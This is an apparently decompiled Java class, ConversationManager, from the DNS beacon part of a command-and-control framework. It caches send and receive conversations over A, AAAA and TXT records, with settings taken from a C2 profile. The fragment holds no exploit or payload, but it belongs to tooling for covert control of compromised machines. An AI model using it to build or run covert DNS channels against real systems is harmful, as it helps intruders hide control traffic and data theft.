package beacon.dns;

import c2profile.Profile;
import common.CommonUtils;

public class ConversationManager {
   protected GeneralCache cache = new GeneralCache();
   protected int maxtxt;
   protected long idlemask;

   public ConversationManager(Profile var1) {
      this.maxtxt = var1.getInt(".dns-beacon.dns_max_txt");
      this.idlemask = CommonUtils.ipToLong(var1.getString(".dns-beacon.dns_idle"));
   }

   public RecvConversation getRecvConversation(String var1, String var2, String var3) {
      return (RecvConversation)this.getConversation(var1, var2, var3, RecvConversation.class);
   }

   public SendConversation getSendConversationA(String var1, String var2, String var3) {
      return (SendConversation)this.getConversation(var1, var2, var3, SendConversationA.class);
   }

   public SendConversation getSendConversationAAAA(String var1, String var2, String var3) {
      return (SendConversation)this.getConversation(var1, var2, var3, SendConversationAAAA.class);
   }

   public SendConversation getSendConversationTXT(String var1, String var2, String var3) {
      return (SendConversation)this.getConversation(var1, var2, var3, SendConversationTXT.class);
   }

   public static final String KEY(String var0, String var1, String var2) {
      StringBuffer var3 = new StringBuffer();
      var3.append(var0);
      var3.append(".");
      var3.append(var1);
      var3.append(".");
      if (var2.length() >= 4) {
         var3.append(var2.substring(var2.length() - 2));
      }

      return var3.toString();
   }

   public Object getConversation(String var1, String var2, String var3, Class var4) {
      String var5 = KEY(var1, var2, var3);
      Object var6 = this.cache.get(var5);
      if (var6 != null) {
         return var6;
      } else if (var4 == RecvConversation.class) {
         RecvConversation var10 = new RecvConversation(var1, var2);
         this.cache.add(var5, var10);
         return var10;
      } else if (var4 == SendConversationA.class) {
         SendConversationA var9 = new SendConversationA(var1, var2, this.idlemask);
         this.cache.add(var5, var9);
         return var9;
      } else if (var4 == SendConversationAAAA.class) {
         SendConversationAAAA var8 = new SendConversationAAAA(var1, var2, this.idlemask);
         this.cache.add(var5, var8);
         return var8;
      } else if (var4 == SendConversationTXT.class) {
         SendConversationTXT var7 = new SendConversationTXT(var1, var2, this.idlemask, this.maxtxt);
         this.cache.add(var5, var7);
         return var7;
      } else {
         return null;
      }
   }

   public void removeConversation(String var1, String var2, String var3) {
      this.cache.remove(KEY(var1, var2, var3));
   }

   public void purge() {
      this.cache.purge("DNS conversations");
   }
}
